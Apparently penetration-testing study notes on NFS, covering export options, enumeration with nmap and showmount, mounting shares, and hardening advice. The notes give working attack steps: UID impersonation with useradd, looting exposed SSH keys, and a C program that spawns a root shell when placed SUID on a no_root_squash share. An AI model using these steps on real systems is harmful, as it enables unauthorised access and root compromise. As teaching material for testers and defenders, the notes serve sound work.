# NFS

## NFS Services

Network File System (NFS) is a distributed file system protocol that allows users to access files and directories on remote servers as if they were local. Originally developed by Sun Microsystems, NFS is primarily used in Unix/Linux environments and can be easier to configure than Samba.

### Basic Concepts

NFS typically operates on port 2049 and uses the Remote Procedure Call (RPC) protocol to facilitate communication between clients and servers.

#### Key Features of NFS

* Transparent file access across networks
* Centralized storage and management
* Support for multiple clients
* Stateless protocol (up to NFSv3)
* Stateful protocol (from NFSv4)

### Server Configuration

The main configuration file for NFS servers is `/etc/exports`. This file defines which directories are shared, to which hosts, and with what permissions.

#### Example Configuration

```
# /etc/exports
/mnt/nfs      10.129.14.0/24(rw,sync,no_subtree_check)
/home/user    *(ro,sync,no_root_squash)
/var/www      10.129.14.10(rw,sync,no_root_squash)
```

#### Common Access Options

| **Option**         | **Description**                                     |
| ------------------ | --------------------------------------------------- |
| `rw`               | Read and write permissions                          |
| `ro`               | Read only permissions                               |
| `sync`             | Synchronous data transfer (safer but slower)        |
| `async`            | Asynchronous data transfer (faster but riskier)     |
| `secure`           | Requires ports below 1024 for client connections    |
| `insecure`         | Allows ports above 1024 for client connections      |
| `no_subtree_check` | Disables subtree checking                           |
| `root_squash`      | Maps root user requests to anonymous user (default) |
| `no_root_squash`   | Allows root access (security risk)                  |
| `all_squash`       | Maps all users to anonymous user                    |

### Dangerous NFS Configurations

Some NFS settings can pose significant security risks:

| **Option**       | **Security Risk**                                         |
| ---------------- | --------------------------------------------------------- |
| `rw`             | Allows write access to the share                          |
| `insecure`       | Permits use of unprivileged ports                         |
| `nohide`         | Exposes mounted file systems beneath exported directories |
| `no_root_squash` | Files created by root keep UID/GID 0                      |

### Enumeration Techniques

#### Using Nmap

```bash
sudo nmap -sV -p 2049 10.129.14.128
sudo nmap --script nfs* -p 2049 10.129.14.128
```

Example output:

```
PORT     STATE SERVICE VERSION
2049/tcp open  nfs     2-4 (RPC #100003)
| nfs-showmount: 
|_  /mnt/nfs 10.129.14.0/24
```

#### Showing Available NFS Shares

```bash
showmount -e 10.129.14.128
```

Output:

```
Export list for 10.129.14.128:
/mnt/nfs 10.129.14.0/24
```

### Mounting NFS Shares

Once you've identified NFS shares, you can mount them to access their contents:

```bash
# Create a mount point
mkdir target-NFS

# Mount the NFS share
sudo mount -t nfs 10.129.14.128:/mnt/nfs ./target-NFS/ -o nolock

# List the contents
cd target-NFS
ls -la
tree .
```

Example output:

```
.
└── mnt
    └── nfs
        ├── id_rsa
        ├── id_rsa.pub
        └── nfs.share

2 directories, 3 files
```

### Common Attack Vectors

#### UID/GID Mapping Attacks

NFS maps users by UID/GID numbers, not by usernames. This can lead to permission issues or security vulnerabilities.

Example attack scenario:

1. Attacker identifies a share with `no_root_squash`
2. Attacker creates a local user with the same UID as a target user on the server
3. Attacker mounts the share and can access files with that user's privileges

```bash
# Check file ownership on mounted share
ls -la

# Create matching user on attacker system
sudo useradd -u 1000 victimuser

# Access files with matched UID
sudo -u victimuser ls -la /mnt/target-NFS/
```

#### Sensitive Information Exposure

NFS shares often contain sensitive information:

* SSH keys
* Configuration files with credentials
* Backup files
* User data

#### Remote Command Execution via NFS

If `no_root_squash` is set, an attacker can:

1. Mount the NFS share
2. Create a malicious SUID binary
3. Execute the binary on the target system to gain elevated privileges

```bash
# Create malicious SUID binary
cat << EOF > /tmp/root.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
}
EOF

# Compile and set SUID bit on NFS mount
gcc /tmp/root.c -o /mnt/target-NFS/root
chmod u+s /mnt/target-NFS/root
```

### Defensive Measures

#### Secure NFS Configuration Best Practices

1. **Restrict exports**: Limit shared directories to specific IP addresses
2. **Use read-only mounts**: When possible, use `ro` instead of `rw`
3. **Enable `root_squash`**: Prevent remote root access
4. **Implement firewalls**: Restrict NFS access to trusted networks
5. **Use NFS v4**: Improved security over earlier versions
6. **Use Kerberos**: Implement strong authentication
7. **Regular auditing**: Monitor shares for unauthorized access

### NFS Penetration Testing Methodology

When testing NFS, follow these steps:

1. **Discovery**: Identify NFS services with port scanning
2. **Enumeration**: List available shares with `showmount`
3. **Access Testing**: Mount shares and test permissions
4. **Privilege Analysis**: Check for misconfigured settings like `no_root_squash`
5. **Data Assessment**: Review exposed data for sensitive information
6. **Exploitation**: Test applicable vulnerabilities
7. **Documentation**: Report findings and recommendations

### Practical Examples

#### Finding World-Readable Files on NFS Shares

```bash
find /mnt/target-NFS -type f -perm -o=r
```

#### Identifying Misconfigured Permissions

```bash
# Find SUID files
find /mnt/target-NFS -perm -4000 -ls

# Find files writable by current user
find /mnt/target-NFS -writable -type f
```

#### Automating NFS Enumeration

```bash
for ip in $(cat targets.txt); do
    echo "Checking $ip"
    showmount -e $ip 2>/dev/null
done
```

By thoroughly understanding NFS services and their security implications, penetration testers can effectively identify and exploit misconfigurations in these systems.
